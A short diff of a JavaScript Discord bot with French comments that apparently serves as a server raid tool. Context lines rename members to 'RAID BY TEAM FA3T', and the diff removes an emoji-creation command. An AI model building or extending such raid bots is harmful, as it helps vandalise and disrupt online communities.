@@ -139,10 +139,6 @@ client.on('message', message => {
         message.guild.members.setNickname("RAID BY TEAM FA3T")
     }
 
-    if(message.content === "rd!emoji"){
-        message.guild.createEmoji('https://cdn.discordapp.com/attachments/519666466145042433/519824123908718604/issou.png', name, 'lol')
-    }
-
 });
 
 // Quand le bot rejoins un serveur :
